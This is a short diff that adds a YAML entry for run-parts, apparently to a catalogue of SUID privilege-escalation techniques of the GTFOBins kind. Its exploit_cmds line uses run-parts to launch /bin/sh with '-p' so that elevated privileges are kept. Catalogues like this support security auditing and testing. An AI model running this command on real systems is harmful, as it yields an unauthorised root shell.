@@ -1,0 +1,4 @@
+name: run-parts
+binary_path: /usr/bin/run-parts
+exploit_cmds:
+- /usr/bin/run-parts --new-session --regex '^sh$' /bin --arg='-p'
